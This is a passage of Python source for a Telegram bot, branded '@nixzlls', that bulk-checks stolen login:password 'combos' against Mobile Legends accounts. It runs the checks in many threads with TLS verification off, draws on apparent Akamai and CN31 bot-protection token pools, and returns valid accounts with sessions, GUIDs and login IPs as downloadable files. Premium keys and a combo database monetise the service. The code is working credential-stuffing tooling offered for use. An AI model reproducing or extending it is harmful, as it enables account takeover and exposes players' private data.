        elif ban_reason and ban_reason != "-":
            lines.append(f"<b>BAN HISTORY:</b> Account was previously banned - now unban")
            lines.append(f"  Reason on record: {ban_reason}")

    lines.append("")
    lines.append("<b>MLBB INFO:</b>")
    lines.append(f"  Region: {region}")
    lines.append(f"  Role ID: {role_id}")
    lines.append(f"  Zone ID: {zone_id}")
    lines.append(f"  GUID: {guid}")
    lines.append(f"  Session: {session}")

    lines.append("")
    lines.append("<b>GAME DATA:</b>")
    lines.append(f"  Skin Count: {skin_count}")
    if skin_breakdown:
        sorted_breakdown = sorted(skin_breakdown.items(), key=lambda x: skin_tier_sort_key(x[0]))
        for stype, scount in sorted_breakdown:
            lines.append(f"    {stype}: {scount}")
    lines.append(f"  Hero Count: {hero_count}")
    lines.append(f"  Collector Point: {collector_point:,}")
    lines.append(f"  Collector Tier: {collector_tier}")
    lines.append(f"  Achievement Pts: {achievement_pts:,}")
    lines.append(f"  Squad: {squad}")
    lines.append(f"  Location: {location}")
    lines.append(f"  Last Login: {last_login}")
    lines.append(f"  Login Country: {last_login_country}")
    lines.append(f"  Account Country: {create_country}")

    if login_history:
        lines.append("  Login History:")
        for lh in login_history[:5]:
            if isinstance(lh, dict):
                lh_time    = lh.get("time", lh.get("date", "?"))
                lh_country = lh.get("country", "?")
                lh_ip      = lh.get("ip", "")
                entry = f"    {lh_time} | {lh_country}"
                if lh_ip:
                    entry += f" | {lh_ip}"
                lines.append(entry)
            else:
                lines.append(f"    {lh}")

    if hero_history:
        unique = []
        for h in hero_history:
            if h not in unique:
                unique.append(h)
            if len(unique) >= 10:
                break
        lines.append(f"  Hero History: {', '.join(unique)}")

    if st:
        wr      = st.get("win_rate", 0)
        matches = st.get("total_matches", 0)
        mvp     = st.get("mvp_count", 0)
        lines.append("")
        lines.append("<b>PLAYER STATISTICS:</b>")
        lines.append(f"  Winrate: {wr}% | Matches: {matches:,} | MVP: {mvp}")

    if heroes:
        hero_parts = []
        for h in heroes[:3]:
            hname = h.get("name", "?")
            hm    = h.get("matches", 0)
            hw    = h.get("win_rate", 0)
            hero_parts.append(f"{hname} ({hm}g / {hw}%)")
        lines.append(f"  Favorite: {', '.join(hero_parts)}")

    lines.append("")
    lines.append("<b>Powered by @nixzlls</b>")
    return "\n".join(lines)

def format_hit_plain(login, password, data):
    name        = data.get("name", "?")
    level       = data.get("level", "?")
    region      = data.get("region", "?")
    role_id     = data.get("role_id", "?")
    zone_id     = data.get("zone_id", "?")
    guid        = data.get("guid", "?")
    session     = data.get("session", "?")
    banned      = data.get("banned", False)
    ban_reason  = data.get("ban_reason", "-") or "-"
    ban_expires = data.get("ban_expires", "") or ""
    bindings    = data.get("bindings", [])
    bind_str    = ", ".join(bindings) if isinstance(bindings, list) and bindings else (str(bindings) if bindings else "None")
    st          = data.get("stats", {})
    heroes      = data.get("frequent_heroes", [])
    gd                 = data.get("game_data", {})
    skin_count         = gd.get("skin_count", 0)
    achievement_pts    = gd.get("achievement_points", 0)
    collector_point    = gd.get("collector_point", 0)
    collector_tier     = gd.get("collector_tier", "N/A")
    squad              = gd.get("squad", "-")
    location           = gd.get("location", "N/A")
    last_login         = gd.get("last_login", "N/A")
    last_login_country = gd.get("last_login_country", "N/A")
    create_country     = gd.get("create_account_country", "N/A")
    hero_count         = gd.get("hero_count", 0)
    skin_breakdown     = gd.get("skin_breakdown", {})
    high_rank_game     = gd.get("high_rank", "")
    current_rank_game  = gd.get("current_rank", "")
    display_rank       = current_rank_game if current_rank_game else data.get("rank", "?")
    display_highest    = high_rank_game if high_rank_game else data.get("highest_rank", "?")
    ban_expired, expire_date = parse_ban_expired(ban_reason, ban_expires)
    if banned and ban_expired:
        banned = False
    ban_status   = "TRUE" if banned else "FALSE"
    status_label = "[ BANNED ]" if banned else "[ SUCCESS ]"
    sep = "────────────────────────"
    lines = [f"ACCOUNT CHECK {status_label}", sep,
             f"LOGIN: {login}:{password}",
             f"NAME: {name}",
             f"LEVEL: {level}",
             f"CURRENT RANK: {display_rank}",
             f"HIGHEST RANK: {display_highest}",
             f"BINDINGS: {bind_str}",
             f"BAN STATUS: {ban_status}"]
    if banned:
        if ban_reason and ban_reason != "-":
            lines.append(f"BAN REASON: {ban_reason}")
        if ban_expires:
            lines.append(f"BAN EXPIRES: {ban_expires}")
    lines += ["", "MLBB INFO:",
              f"  Region: {region}",
              f"  Role ID: {role_id}",
              f"  Zone ID: {zone_id}",
              f"  GUID: {guid}",
              f"  Session: {session}",
              "", "GAME DATA:",
              f"  Skin Count: {skin_count}"]
    if skin_breakdown:
        sorted_breakdown = sorted(skin_breakdown.items(), key=lambda x: skin_tier_sort_key(x[0]))
        for stype, scount in sorted_breakdown:
            lines.append(f"    {stype}: {scount}")
    lines += [f"  Hero Count: {hero_count}",
              f"  Collector Point: {collector_point:,}",
              f"  Collector Tier: {collector_tier}",
              f"  Achievement Pts: {achievement_pts:,}",
              f"  Squad: {squad}",
              f"  Location: {location}",
              f"  Last Login: {last_login}",
              f"  Login Country: {last_login_country}",
              f"  Account Country: {create_country}"]
    if st:
        wr      = st.get("win_rate", 0)
        matches = st.get("total_matches", 0)
        mvp     = st.get("mvp_count", 0)
        lines += ["", "PLAYER STATISTICS:",
                  f"  Winrate: {wr}% | Matches: {matches:,} | MVP: {mvp}"]
    if heroes:
        hero_parts = []
        for h in heroes[:3]:
            hname = h.get("name", "?")
            hm    = h.get("matches", 0)
            hw    = h.get("win_rate", 0)
            hero_parts.append(f"{hname} ({hm}g / {hw}%)")
        lines.append(f"  Favorite: {', '.join(hero_parts)}")
    lines += ["", "Powered by @nixzlls"]
    return "\n".join(lines)


def build_final_summary(st_obj, stopped=False):
    v   = st_obj["valid"]
    iv  = st_obj["invalid"]
    er  = st_obj["errors"]
    b   = st_obj["banned"]
    nb  = v - b
    ch  = st_obj["checked"]
    t   = st_obj["total"]
    von = st_obj.get("v2l_on",  0)
    vof = st_obj.get("v2l_off", 0)
    emp = st_obj.get("empass",  0)
    usp = st_obj.get("userpass",0)

    elapsed = time.time() - st_obj["start_time"]
    h = int(elapsed // 3600)
    m = int((elapsed % 3600) // 60)
    s = int(elapsed % 60)
    elapsed_str = f"{h}h {m}m {s}s" if h else (f"{m}m {s}s" if m else f"{s}s")
    rate = ch / elapsed if elapsed > 0 else 0

    def bar(count, total):
        if total == 0:
            return "░" * 20
        filled = int((count / total) * 20)
        return "█" * filled + "░" * (20 - filled)

    sep  = "━━━━━━━━━━━━━━━━━━━━━━━━"
    sep2 = "────────────────────────"
    status = "STOPPED" if stopped else "COMPLETE"

    msg  = f"{sep}\n  <b>FINAL RESULTS — {status}</b>\n{sep}\n\n"
    msg += f"<b>Checked</b>   {ch} / {t}\n\n"
    msg += f"{sep2}\n"
    msg += f"<b>Valid</b>    <code>{bar(v,  max(ch,1))}</code>  {v}\n"
    msg += f"<b>Invalid</b>  <code>{bar(iv, max(ch,1))}</code>  {iv}\n"
    msg += f"<b>Banned</b>   <code>{bar(b,  max(v,1))}</code>  {b}\n"
    msg += f"<b>V2L On</b>   <code>{bar(von,max(v,1))}</code>  {von}\n"
    msg += f"<b>V2L Off</b>  <code>{bar(vof,max(v,1))}</code>  {vof}\n"
    msg += f"<b>Errors</b>   <code>{bar(er, max(ch,1))}</code>  {er}\n"
    msg += f"{sep2}\n"
    msg += f"<b>EmailPass</b>  <code>{bar(emp,max(v,1))}</code>  {emp}\n"
    msg += f"<b>UserPass</b>   <code>{bar(usp,max(v,1))}</code>  {usp}\n"
    msg += f"{sep2}\n"
    msg += f"<b>Time</b>    {elapsed_str}\n"
    msg += f"<b>Rate</b>    {rate:.2f} acc/s\n"

    top_accounts = st_obj.get("top_accounts", [])
    if top_accounts:
        msg += f"\n{sep2}\n<b>TOP ACCOUNTS</b>\n"
        for i, acc in enumerate(top_accounts[:3], 1):
            msg += f"  {i}. {acc['ign']} — Lv.{acc['level']} | {acc['rank']} | {acc['country']}\n"

    collector_stats = st_obj.get("collector_stats", {})
    collector_order = ["World","Mega","Exalted","Renowned","Collector","Epic","Special","Elite","Rare","Normal"]
    col_lines = ""
    for sk in collector_order:
        cnt = collector_stats.get(sk, 0)
        if cnt > 0:
            col_lines += f"  {sk}: {cnt}\n"
    if col_lines:
        msg += f"\n{sep2}\n<b>COLLECTOR TIER</b>\n{col_lines}"

    rank_counts = st_obj.get("rank_counts", {})
    rank_order  = ["Mythic","Legend","Epic","Grandmaster","Master","Elite","Warrior"]
    rank_lines  = ""
    for rk in rank_order:
        cnt = rank_counts.get(rk, 0)
        if cnt > 0:
            rank_lines += f"  {rk}: {cnt}\n"
    if rank_lines:
        msg += f"\n{sep2}\n<b>RANK BREAKDOWN</b>\n{rank_lines}"

    msg += f"\n{sep}\n<b>Powered by @nixzlls</b>"
    return msg


COLLECTOR_TIER_ORDER = [
    "World Collector",
    "Mega Collector",
    "Exalted Collector",
    "Renowned Collector",
    "Expert Collector",
    "Seasoned Collector",
    "Junior Collector",
    "Amateur Collector",
    "No Tier",
]

def _collector_tier_sort_key(tier_name):
    try:
        return COLLECTOR_TIER_ORDER.index(tier_name)
    except ValueError:
        return len(COLLECTOR_TIER_ORDER)

def build_stats_msg(st_obj):
    v   = st_obj["valid"]
    iv  = st_obj["invalid"]
    er  = st_obj["errors"]
    b   = st_obj["banned"]
    nb  = v - b
    ch  = st_obj["checked"]
    t   = st_obj["total"]
    von = st_obj.get("v2l_on", 0)
    vof = st_obj.get("v2l_off", 0)
    emp = st_obj.get("empass", 0)
    usp = st_obj.get("userpass", 0)

    elapsed = time.time() - st_obj["start_time"]
    rate    = ch / elapsed if elapsed > 0 else 0
    cpm     = rate * 60
    eta     = (t - ch) / rate if rate > 0 and ch < t else 0
    h = int(elapsed // 3600)
    m = int((elapsed % 3600) // 60)
    s = int(elapsed % 60)
    elapsed_str = f"{h}h {m}m {s}s" if h else (f"{m}m {s}s" if m else f"{s}s")
    eta_str = f"{int(eta//60)}m {int(eta%60)}s"

    pct    = (ch / t * 100) if t > 0 else 0
    filled = int(20 * pct / 100)
    bar    = "█" * filled + "░" * (20 - filled)

    def mb(count, denom):
        if denom == 0:
            return "░" * 14
        w  = 14
        f2 = int((count / denom) * w)
        return "█" * f2 + "░" * (w - f2)

    sep   = "────────────────────────"
    sep2  = "━━━━━━━━━━━━━━━━━━━━━━━━"
    done  = ch >= t

    msg  = f"{sep2}\n  <b>LIVE STATS</b>\n{sep2}\n\n"
    msg += f"<b>Progress</b>  <code>{bar}</code>  {pct:.1f}%  {ch}/{t}\n\n"
    msg += f"{sep}\n"
    msg += f"<b>Valid</b>    <code>{mb(v,  max(ch,1))}</code>  {v}\n"
    msg += f"<b>Invalid</b>  <code>{mb(iv, max(ch,1))}</code>  {iv}\n"
    msg += f"<b>Banned</b>   <code>{mb(b,  max(v,1))}</code>  {b}\n"
    msg += f"<b>V2L On</b>   <code>{mb(von,max(v,1))}</code>  {von}\n"
    msg += f"<b>V2L Off</b>  <code>{mb(vof,max(v,1))}</code>  {vof}\n"
    msg += f"<b>Errors</b>   <code>{mb(er, max(ch,1))}</code>  {er}\n"
    msg += f"{sep}\n"
    msg += f"<b>Combo Type</b>\n"
    msg += f"  EmailPass  <code>{mb(emp,max(v,1))}</code>  {emp}\n"
    msg += f"  UserPass   <code>{mb(usp,max(v,1))}</code>  {usp}\n"
    msg += f"{sep}\n"
    msg += f"<b>Rate</b>     {rate:.2f} acc/s\n"
    msg += f"<b>CPM</b>      {cpm:.1f}/min\n"
    msg += f"<b>ETA</b>      {eta_str}\n"
    msg += f"<b>Elapsed</b>  {elapsed_str}\n"

    collector_stats = st_obj.get("collector_stats", {})
    if collector_stats:
        sorted_tiers = sorted(collector_stats.items(), key=lambda x: _collector_tier_sort_key(x[0]))
        col_lines = ""
        for ct, cnt in sorted_tiers:
            if cnt > 0:
                col_lines += f"  {ct}: {cnt}\n"
        if col_lines:
            msg += f"{sep}\n<b>Collector Tier</b>\n{col_lines}"

    msg += f"\n{'checking...' if not done else 'complete'}"
    return msg

def update_stats_after_hit(st_obj, display_rank, collector_tier, region, name, level):
    with lock:
        try:
            lvl = int(level)
        except Exception:
            lvl = 0
        st_obj["country_stats"][region] = st_obj["country_stats"].get(region, 0) + 1
        rank_category = convert_rank_from_name(display_rank)
        st_obj["rank_counts"][rank_category] = st_obj["rank_counts"].get(rank_category, 0) + 1
        st_obj["top_accounts"].append({"ign": name, "level": lvl, "country": region, "rank": display_rank})
        st_obj["top_accounts"].sort(key=lambda x: x["level"], reverse=True)
        st_obj["top_accounts"] = st_obj["top_accounts"][:5]
        major = "No Tier"
        if collector_tier and collector_tier not in ("N/A", ""):
            major = collector_tier.split(" V")[0].split(" IV")[0].split(" III")[0].split(" II")[0].split(" I")[0].rstrip()
            if not major:
                major = "No Tier"
        st_obj["collector_stats"][major] = st_obj["collector_stats"].get(major, 0) + 1

def fetch_stock_summary():
    ak_pool = "N/A"
    cn_pool = "N/A"
    ak_ok   = False
    cn_ok   = False
    try:
        r = requests.get(AKAMAI_API, timeout=8)
        d = r.json()
        ak_pool = d.get("pool_size") or d.get("pool") or d.get("count") or d.get("total") or d.get("size") or "N/A"
        try:
            ak_ok = int(ak_pool) > 0
        except Exception:
            ak_ok = str(ak_pool) not in ("0", "N/A", "")
    except Exception:
        pass
    try:
        r2 = requests.get(CN31_API, timeout=8)
        d2 = r2.json()
        cn_pool = d2.get("pool_size") or d2.get("pool") or d2.get("count") or d2.get("total") or d2.get("size") or "N/A"
        try:
            cn_ok = int(cn_pool) > 0
        except Exception:
            cn_ok = str(cn_pool) not in ("0", "N/A", "")
    except Exception:
        pass
    return ak_pool, cn_pool, ak_ok, cn_ok


def fetch_akamai_stock():
    for attempt in range(2):
        try:
            r = requests.get(AKAMAI_API, timeout=15)
            d = r.json()
            pool   = d.get("pool_size", "?")
            served = d.get("tokens_served", "?")
            rate   = d.get("rate_per_min", "?")
            uptime = int(d.get("uptime_minutes") or 0)
            return pool, served, rate, uptime
        except requests.exceptions.ConnectTimeout:
            if attempt == 0:
                continue
            return "OFFLINE", "OFFLINE", "OFFLINE", 0
        except requests.exceptions.ConnectionError:
            if attempt == 0:
                continue
            return "UNREACHABLE", "UNREACHABLE", "UNREACHABLE", 0
        except Exception:
            if attempt == 0:
                continue
            return "N/A", "N/A", "N/A", 0
    return "N/A", "N/A", "N/A", 0

def fetch_cn31_stock():
    for attempt in range(2):
        try:
            r = requests.get(CN31_API, timeout=15)
            d = r.json()
            pool      = d.get("pool_size", "?")
            served    = d.get("tokens_served", "?")
            workers   = d.get("active_workers", "?")
            generated = d.get("tokens_generated", "?")
            return pool, served, workers, generated
        except requests.exceptions.ConnectTimeout:
            if attempt == 0:
                continue
            return "OFFLINE", "OFFLINE", "OFFLINE", "OFFLINE"
        except requests.exceptions.ConnectionError:
            if attempt == 0:
                continue
            return "UNREACHABLE", "UNREACHABLE", "UNREACHABLE", "UNREACHABLE"
        except Exception:
            if attempt == 0:
                continue
            return "N/A", "N/A", "N/A", "N/A"
    return "N/A", "N/A", "N/A", "N/A"

def build_akamai_msg():
    ak_pool, ak_served, ak_rate, ak_uptime = fetch_akamai_stock()
    sep     = "────────────────────────"
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg  = f"{sep}\n  <b>AKAMAI STOCK</b>\n{sep}\n\n"
    msg += f"  Stock: {ak_pool}\n"
    msg += f"  Served: {ak_served}\n"
    msg += f"  Rate: {ak_rate}/min\n"
    msg += f"  Uptime: {ak_uptime} min\n"
    msg += f"  Last Served: {now_str}\n"
    return msg

def build_cn31_msg():
    cn_pool, cn_served, cn_workers, cn_gen = fetch_cn31_stock()
    sep     = "────────────────────────"
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    offline = str(cn_pool) in ("OFFLINE", "UNREACHABLE", "ERROR")
    status  = f"  <b>⚠ SERVER {cn_pool}</b>\n  Checking may fail until server is back.\n" if offline else ""
    msg  = f"{sep}\n  <b>CN31 STOCK</b>\n{sep}\n\n"
    msg += status
    msg += f"  Stock: {cn_pool}\n"
    msg += f"  Served: {cn_served}\n"
    msg += f"  Generated: {cn_gen}\n"
    msg += f"  Workers: {cn_workers}\n"
    msg += f"  Last Checked: {now_str}\n"
    return msg

def main_menu_keyboard(uid=None, db=None):
    user = None
    prem = False
    if uid and db:
        user = db["users"].get(str(uid))
        if user:
            prem = is_premium(user)

    keyboard = [
        [
            InlineKeyboardButton("[ FULL INFO ]", callback_data="check_accounts"),
            InlineKeyboardButton("[ MY INFO ]", callback_data="my_info"),
        ],
        [
            InlineKeyboardButton("[ BAN CHECK ]", callback_data="ban_check"),
            InlineKeyboardButton("[ REFERRAL ]", callback_data="referral"),
        ],
        [
            InlineKeyboardButton("[ AKAMAI STOCK ]", callback_data="akamai_stock"),
            InlineKeyboardButton("[ CN31 STOCK ]", callback_data="cn31_stock"),
        ],
        [
            InlineKeyboardButton("[ PRICING ]", callback_data="pricing"),
            InlineKeyboardButton("[ REDEEM KEY ]", callback_data="redeem_key"),
        ],
        [
            InlineKeyboardButton("[ FEEDBACK ]", callback_data="feedback"),
            InlineKeyboardButton("[ COMBO FIXER ]", callback_data="combo_fixer"),
        ],
        [
            InlineKeyboardButton("[ TOP CHECKERS ]", callback_data="top_checkers"),
            InlineKeyboardButton("[ DB ACCOUNTS ]", callback_data="db_accounts"),
        ],
        [
            InlineKeyboardButton("[ ANNOUNCEMENTS ]", callback_data="announcements"),
            InlineKeyboardButton("[ HOW IT WORKS ]",  callback_data="how_it_works"),
        ],
    ]
    if uid == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("[ ADMIN PANEL ]", callback_data="admin_panel")])
    keyboard.append([InlineKeyboardButton("[ EXIT ]", callback_data="exit")])
    return InlineKeyboardMarkup(keyboard)

def admin_menu_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("All Users", callback_data="admin_users_page_0"),
            InlineKeyboardButton("Premium Users", callback_data="admin_premium"),
        ],
        [
            InlineKeyboardButton("Free Users", callback_data="admin_free"),
            InlineKeyboardButton("Global Stats", callback_data="admin_globalstats"),
        ],
        [
            InlineKeyboardButton("Generate Key", callback_data="admin_genkey"),
            InlineKeyboardButton("List Keys", callback_data="admin_listkeys"),
        ],
        [
            InlineKeyboardButton("Add Premium", callback_data="admin_addpremium"),
            InlineKeyboardButton("Revoke Premium", callback_data="admin_revokepremium"),
        ],
        [
            InlineKeyboardButton("Add Free Checks", callback_data="admin_addchecks"),
            InlineKeyboardButton("View Feedback", callback_data="admin_feedback"),
        ],
        [
            InlineKeyboardButton("Send Announcement", callback_data="admin_announce"),
            InlineKeyboardButton("Create Vote", callback_data="admin_vote"),
        ],
        [
            InlineKeyboardButton("View Votes", callback_data="admin_viewvotes"),
            InlineKeyboardButton("Broadcast", callback_data="admin_broadcast"),
        ],
        [
            InlineKeyboardButton("Add Combo DB", callback_data="admin_add_combo_db"),
            InlineKeyboardButton("View Combo DB", callback_data="admin_view_combo_db"),
        ],
        [InlineKeyboardButton("Back", callback_data="back_main")],
    ]
    return InlineKeyboardMarkup(keyboard)

def back_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="back_main")]])

def back_admin_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("Back to Admin", callback_data="admin_panel")]])

def check_single_thread(login, password, uid, chat_id, context, st_obj, app_loop):
    if cancel_flag.get(uid):
        return

    try:
        r    = requests.get(API_URL, params={"login": login, "password": password}, timeout=60, verify=False)
        data = r.json()
    except requests.exceptions.Timeout:
        with lock:
            st_obj["errors"]  += 1
            st_obj["checked"] += 1
        return
    except Exception:
        with lock:
            st_obj["errors"]  += 1
            st_obj["checked"] += 1
        return

    if cancel_flag.get(uid):
        return

    status = data.get("status", "error")

    if status == "valid":
        banned = data.get("banned", False)
        ban_expired, _ = parse_ban_expired(data.get("ban_reason", ""), data.get("ban_expires", ""))

        gd                = data.get("game_data", {})
        current_rank_game = gd.get("current_rank", "")
        display_rank      = current_rank_game if current_rank_game else data.get("rank", "?")
        collector_tier    = gd.get("collector_tier", "N/A")
        region            = data.get("region", "?")
        name              = data.get("name", "?")
        level             = data.get("level", "?")
        v2l_status        = gd.get("v2l_status", "") or ""
        v2l_active        = str(v2l_status).strip().upper() not in ("", "N/A", "NONE", "FALSE", "0", "NO", "NOT ELIGIBLE", "INELIGIBLE")
        is_actually_banned = banned and not ban_expired
        is_email = is_email_account(login)

        with lock:
            st_obj["valid"]   += 1
            st_obj["checked"] += 1
            if is_actually_banned:
                st_obj["banned"] += 1
            if not is_actually_banned:
                if v2l_active:
                    st_obj["v2l_on"]  = st_obj.get("v2l_on", 0) + 1
                else:
                    st_obj["v2l_off"] = st_obj.get("v2l_off", 0) + 1
            if is_email:
                st_obj["empass"]   = st_obj.get("empass", 0) + 1
            else:
                st_obj["userpass"] = st_obj.get("userpass", 0) + 1

        update_stats_after_hit(st_obj, display_rank, collector_tier, region, name, level)

        plain_text = format_hit_plain(login, password, data)
        with lock:
            if is_actually_banned:
                st_obj.setdefault("ban_lines", []).append(plain_text)
            elif v2l_active:
                st_obj.setdefault("v2l_on_lines",  []).append(plain_text)
                st_obj.setdefault("valid_lines",    []).append(plain_text)
            else:
                st_obj.setdefault("v2l_off_lines", []).append(plain_text)
                st_obj.setdefault("valid_lines",   []).append(plain_text)
        time.sleep(0.05)

    elif status == "invalid":
        with lock:
            st_obj["invalid"] += 1
            st_obj["checked"] += 1

    else:
        with lock:
            st_obj["errors"]  += 1
            st_obj["checked"] += 1


def _update_live_stats(chat_id, context, st_obj, app_loop):
    msg_id = st_obj.get("status_msg_id")
    if not msg_id:
        return
    checked = st_obj["checked"]
    total   = st_obj["total"]
    done    = checked >= total
    if not done and checked % 3 != 0:
        return
    try:
        kb = None if done else InlineKeyboardMarkup([[InlineKeyboardButton("⏹ STOP", callback_data="stop_check")]])
        _safe_threadsafe(
            context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg_id,
                text=build_stats_msg(st_obj),
                parse_mode="HTML",
                reply_markup=kb
            ),
            app_loop
        )
    except Exception:
        pass

def _start_stats_updater(chat_id, context, st_obj, app_loop, uid):
    def _loop():
        while True:
            time.sleep(3)
            if stats_store.get(uid) is not st_obj:
                break
            msg_id = st_obj.get("status_msg_id")
            if not msg_id:
                break
            checked = st_obj["checked"]
            total   = st_obj["total"]
            done    = checked >= total
            try:
                kb = None if done else InlineKeyboardMarkup([[InlineKeyboardButton("⏹ STOP", callback_data="stop_check")]])
                _safe_threadsafe(
                    context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=msg_id,
                        text=build_stats_msg(st_obj),
                        parse_mode="HTML",
                        reply_markup=kb
                    ),
                    app_loop
                )
            except Exception:
                pass
            if done:
                break
    t = threading.Thread(target=_loop, daemon=True)
    t.start()
    return t

def run_check_job(uid, chat_id, combos, context, st_obj, app_loop, num_threads, db):
    executor = ThreadPoolExecutor(max_workers=num_threads)
    stopped = False
    _start_stats_updater(chat_id, context, st_obj, app_loop, uid)
    try:
        futs = {executor.submit(check_single_thread, lo, pw, uid, chat_id, context, st_obj, app_loop): (lo, pw) for lo, pw in combos}
        for fut in as_completed(futs):
            if cancel_flag.get(uid):
                stopped = True
                break
            try:
                fut.result()
            except Exception:
                pass
    finally:
        executor.shutdown(wait=False)

    hit_mode    = st_obj.get("hit_mode", "send_hits_txt")
    valid_lines = st_obj.get("valid_lines", [])
    ban_lines   = st_obj.get("ban_lines", [])

    if hit_mode in ("send_hits_onebyone", "send_hits_both"):
        for vl in valid_lines:
            try:
                _safe_threadsafe(
                    context.bot.send_message(
                        chat_id=chat_id,
                        text=f"<b>HIT — NOT BANNED</b>\n\n{vl}",
                        parse_mode="HTML"
                    ),
                    app_loop
                ).result(timeout=8)
            except Exception:
                pass
        for bl in ban_lines:
            try:
                _safe_threadsafe(
                    context.bot.send_message(
                        chat_id=chat_id,
                        text=f"<b>HIT — BANNED</b>\n\n{bl}",
                        parse_mode="HTML"
                    ),
                    app_loop
                ).result(timeout=8)
            except Exception:
                pass

    if hit_mode in ("send_hits_txt", "send_hits_both"):
        if valid_lines:
            vb   = "\n\n".join(valid_lines).encode("utf-8")
            vbuf = io.BytesIO(vb)
            vbuf.name = "valid_not_ban.txt"
            _safe_threadsafe(
                context.bot.send_document(
                    chat_id=chat_id,
                    document=vbuf,
                    caption=f"<b>VALID — NOT BANNED</b> | {len(valid_lines)} account(s)",
                    parse_mode="HTML"
                ),
                app_loop
            )

        if ban_lines:
            bb   = "\n\n".join(ban_lines).encode("utf-8")
            bbuf = io.BytesIO(bb)
            bbuf.name = "valid_banned.txt"
            _safe_threadsafe(
                context.bot.send_document(
                    chat_id=chat_id,
                    document=bbuf,
                    caption=f"<b>VALID — BANNED</b> | {len(ban_lines)} account(s)",
                    parse_mode="HTML"
                ),
                app_loop
            )

        v2l_on_lines  = st_obj.get("v2l_on_lines", [])
        v2l_off_lines = st_obj.get("v2l_off_lines", [])

        if v2l_on_lines:
            vob   = "\n\n".join(v2l_on_lines).encode("utf-8")
            vobuf = io.BytesIO(vob)
            vobuf.name = "v2l_on.txt"
            _safe_threadsafe(
                context.bot.send_document(
                    chat_id=chat_id,
                    document=vobuf,
                    caption=f"<b>V2L ON — NOT BANNED</b> | {len(v2l_on_lines)} account(s)",
                    parse_mode="HTML"
                ),
                app_loop
            )

        if v2l_off_lines:
            vfb   = "\n\n".join(v2l_off_lines).encode("utf-8")
            vfbuf = io.BytesIO(vfb)
            vfbuf.name = "v2l_off.txt"
            _safe_threadsafe(
                context.bot.send_document(
                    chat_id=chat_id,
                    document=vfbuf,
                    caption=f"<b>V2L OFF — NOT BANNED</b> | {len(v2l_off_lines)} account(s)",
                    parse_mode="HTML"
                ),
                app_loop
            )

    summary = build_final_summary(st_obj, stopped=stopped)

    with data_lock:
        db2   = get_db()
        user2 = get_user(db2, uid)
        user2["total_checked"] = user2.get("total_checked", 0) + st_obj["checked"]
        user2["total_valid"]   = user2.get("total_valid", 0) + st_obj["valid"]
        user2["total_invalid"] = user2.get("total_invalid", 0) + st_obj["invalid"]
        db2["global_stats"]["total_checked"] = db2["global_stats"].get("total_checked", 0) + st_obj["checked"]
        db2["global_stats"]["total_valid"]   = db2["global_stats"].get("total_valid", 0) + st_obj["valid"]
        db2["global_stats"]["total_invalid"] = db2["global_stats"].get("total_invalid", 0) + st_obj["invalid"]
        save_db(db2)

    _safe_threadsafe(
        context.bot.send_message(chat_id=chat_id, text=summary, parse_mode="HTML"),
        app_loop
    )

    with free_queue_lock:
        free_queue_active.discard(uid)

    process_next_free_queue(context, app_loop)

def process_next_free_queue(context, app_loop):
    with free_queue_lock:
        if free_check_queue.empty():
            return
        next_job = free_check_queue.get()

    uid, chat_id, combos, st_obj, num_lines = next_job

    with free_queue_lock:
        free_queue_active.add(uid)

    with data_lock:
        db2   = get_db()
        user2 = get_user(db2, uid)
        deduct_checks(user2, num_lines)
        save_db(db2)

    _safe_threadsafe(
        context.bot.send_message(
            chat_id=chat_id,
            text=f" Your check has started! ({num_lines} accounts)",
            parse_mode="HTML"
        ),
        app_loop
    )

    threading.Thread(
        target=run_check_job,
        args=(uid, chat_id, combos, context, st_obj, app_loop, FREE_THREADS, {}),
        daemon=True
    ).start()

async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not context.args:
        await update.message.reply_text(
            "Usage: /key YOUR-KEY-HERE\nExample: /key NIXSZ-ABCD1234",
            reply_markup=back_keyboard()
        )
        return ConversationHandler.END
    key_str = context.args[0].upper()
    with data_lock:
        db  = get_db()
        ok, msg = redeem_key(db, uid, key_str)
        save_db(db)
    await update.message.reply_text(msg, reply_markup=back_keyboard())
    return ConversationHandler.END

async def is_member(bot, uid):
    try:
        m = await bot.get_chat_member(f"@{CHANNEL}", uid)
        return m.status in ("member", "administrator", "creator")
    except Exception:
        return False

def join_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("[ JOIN CHANNEL ]", url=f"https://t.me/{CHANNEL}")],
        [InlineKeyboardButton("[ VERIFY MEMBERSHIP ]", callback_data="verify_join")],
    ])

async def send_join_prompt(target, context):
    sep  = "━━━━━━━━━━━━━━━━━━━━━━━━"
    sep2 = "────────────────────────"
    text = (
        f"{sep}\n"
        f"  <b>ACCESS RESTRICTED</b>\n"
        f"{sep}\n\n"
        f"  This bot is exclusive to members\n"
        f"  of our official channel.\n\n"
        f"{sep2}\n\n"
        f"  Channel: <b>@{CHANNEL}</b>\n\n"
        f"  STEP 1  Join the channel below\n"
        f"  STEP 2  Click Verify Membership\n\n"
        f"{sep2}\n\n"
        f"  Once verified you will have\n"
        f"  full access to all bot features."
    )
    if hasattr(target, "edit_message_text"):
        await target.edit_message_text(text, parse_mode="HTML", reply_markup=join_keyboard())
    else:
        await target.reply_text(text, parse_mode="HTML", reply_markup=join_keyboard())

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    uname = update.effective_user.username
    fname = update.effective_user.first_name

    if not await is_member(context.bot, uid):
        await send_join_prompt(update.message, context)
        return ConversationHandler.END

    with data_lock:
        db   = get_db()
        ensure_db_keys(db)
        user = get_user(db, uid)
        user["username"]   = uname
        user["first_name"] = fname

        args = context.args
        ref_applied_msg = ""
        if args and args[0].startswith("ref_"):
            ref_code    = args[0][4:]
            new_uid     = str(uid)
            referrer_uid = None
            if not user.get("referred_by"):
                for uid2, u2 in db["users"].items():
                    if u2.get("referral_code") == ref_code and uid2 != new_uid:
                        referrer_uid = uid2
                        break
                if referrer_uid:
                    referrer = db["users"][referrer_uid]
                    user["referred_by"] = referrer_uid
                    referrer["referral_count"]  = referrer.get("referral_count", 0) + 1
